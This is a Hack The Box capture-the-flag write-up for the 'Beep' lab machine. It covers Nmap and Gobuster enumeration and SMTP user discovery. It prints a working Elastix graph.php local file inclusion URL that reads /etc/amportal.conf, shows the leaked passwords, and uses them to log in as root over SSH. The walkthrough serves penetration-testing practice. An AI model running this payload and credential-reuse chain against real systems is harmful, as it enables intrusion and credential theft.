---
title: "Beep"
---

# Hack The Box - Beep

![Cap dashboard screenshot](beep.JPG)

Before I start, I usually reset the box. It’s common for services to crash or behave strangely after other people have exploited them, and I don’t want any leftover clues from previous solves.

## Recon

I began with initial enumeration using Nmap.

```bash
# Nmap 7.70 scan initiated Thu Oct  4 22:10:06 2018 as: nmap -v -sV -oA beep_tcp 10.10.10.7
nmap -v -sV -oA beep_tcp 10.10.10.7
```

The scan showed a number of open services:

```text
Nmap scan report for 10.10.10.7
Host is up (0.039s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp?
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3?
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap?
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
993/tcp   open  imaps?
995/tcp   open  pop3s?
3306/tcp  open  mysql      MySQL (unauthorized)
4445/tcp  open  upnotifyp?
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Host: 127.0.0.1
```

At the same time, I ran a full TCP port scan to catch anything missed by the first pass.

```bash
# Nmap 7.70 scan initiated Thu Oct 18 21:41:22 2018 as: nmap -v -sV -p- -oA beep_full_tcp 10.10.10.7
nmap -v -sV -p- -oA beep_full_tcp 10.10.10.7
```

That scan revealed a few more services:

```text
Nmap scan report for 10.10.10.7
Host is up (0.033s latency).
Not shown: 65519 closed ports
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 4.3 (protocol 2.0)
25/tcp    open  smtp       Postfix smtpd
80/tcp    open  http       Apache httpd 2.2.3
110/tcp   open  pop3       Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
111/tcp   open  rpcbind    2 (RPC #100000)
143/tcp   open  imap       Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4
443/tcp   open  ssl/http   Apache httpd 2.2.3 ((CentOS))
745/tcp   open  status     1 (RPC #100024)
993/tcp   open  ssl/imap   Cyrus imapd
995/tcp   open  pop3       Cyrus pop3d
3306/tcp  open  mysql      MySQL (unauthorized)
4190/tcp  open  sieve      Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap)
4445/tcp  open  upnotifyp?
4559/tcp  open  hylafax    HylaFAX 4.3.10
5038/tcp  open  asterisk   Asterisk Call Manager 1.1
10000/tcp open  http       MiniServ 1.570 (Webmin httpd)
Service Info: Hosts:  beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix
```

This gave me several possible attack surfaces, so I started by checking the service versions and matching them against known issues. Port 22 was not especially interesting at first, though very old SSH versions can sometimes be useful for username enumeration.

Port 25 looked more promising, since SMTP servers often allow user discovery through the `VRFY` command. I used a Metasploit auxiliary module for enumeration:

```text
msf auxiliary(scanner/smtp/smtp_enum) > run

[*] 10.10.10.7:25         - 10.10.10.7:25 Banner: 220 beep.localdomain ESMTP Postfix
[+] 10.10.10.7:25         - 10.10.10.7:25 Users found: , adm, bin, daemon, fax, ftp, games, gdm, gopher, haldaemon, halt, lp, mail, news, nobody, operator, postgres, postmaster, sshd, sync, uucp, webmaster, www
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Web Enumeration

Ports 80 and 443 both exposed a web server, and the landing page was an Elastix login portal. I tried a few login attempts, but the system quickly started blocking requests, so brute force was clearly not the best path.

I moved to content discovery with Gobuster:

```bash
root@kali:~/htb/beep# gobuster -u https://10.10.10.7:443 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt -k
```

The scan returned several interesting directories:

```text
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.7:443/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 10s
=====================================================
2018/11/01 21:56:09 Starting gobuster
=====================================================
/modules (Status: 301)
/images (Status: 301)
/admin (Status: 301)
/themes (Status: 301)
/help (Status: 301)
/var (Status: 301)
/mail (Status: 301)
/static (Status: 301)
/lang (Status: 301)
/libs (Status: 301)
/panel (Status: 301)
/configs (Status: 301)
/recordings (Status: 301)
/vtigercrm (Status: 301)
=====================================================
2018/11/01 22:13:06 Finished
=====================================================
```

These directories hinted at multiple services and products:
- Elastix login at `/`
- Roundcube webmail at `/mail/`
- FreePBX admin at `/admin/config.php`
- FreePBX recordings at `/recordings/index.php`
- HylaFAX-related content at `/static/faxutils.htm`
- vtiger CRM at `/vtigercrm/`

Port 10000 also hosted Webmin via MiniServ 1.570, and exploit research showed a possible RCE path there, but it required authentication.

## Elastix LFI

One useful finding was that Elastix 2.2.0 was vulnerable to local file inclusion through `vtigercrm/graph.php`.

From ExploitDB, the relevant entry was:

- Elastix 2.2.0 - `graph.php` Local File Inclusion
- FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution

Since `/vtigercrm/` existed on the target, I tested the LFI against `amportal.conf`:

```text
https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

That request exposed configuration data containing credentials:

```text
AMPDBHOST=localhost
AMPDBENGINE=mysql
# AMPDBNAME=asterisk
AMPDBUSER=asteriskuser
# AMPDBPASS=amp109
AMPDBPASS=jEhdIekWmdjE
AMPENGINE=asterisk
AMPMGRUSER=admin
#AMPMGRPASS=amp111
AMPMGRPASS=jEhdIekWmdjE
```

These credentials gave me a strong foothold for authentication testing.

## Root Access

I tried the recovered password against SSH as `root`, and it worked.

```bash
ssh root@10.10.10.7
```

```text
root@10.10.10.7's password:
Last login: Fri Aug 25 18:05:54 2017

Welcome to Elastix
----------------------------------------------------

To access your Elastix System, using a separate workstation (PC/MAC/Linux)
Open the Internet Browser using the following URL:
http://10.10.10.7
```

After logging in, I confirmed root access:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
```

## Attack Path

- Reset the box before starting to avoid stale state.
- Run initial Nmap scans to identify exposed services.
- Enumerate SMTP users with `VRFY`.
- Discover the Elastix web portal.
- Use Gobuster to find hidden directories.
- Identify `/vtigercrm/` and test for LFI.
- Read `/etc/amportal.conf` through the vulnerable parameter.
- Extract credentials from the configuration file.
- Authenticate as root over SSH.
- Confirm full system compromise.
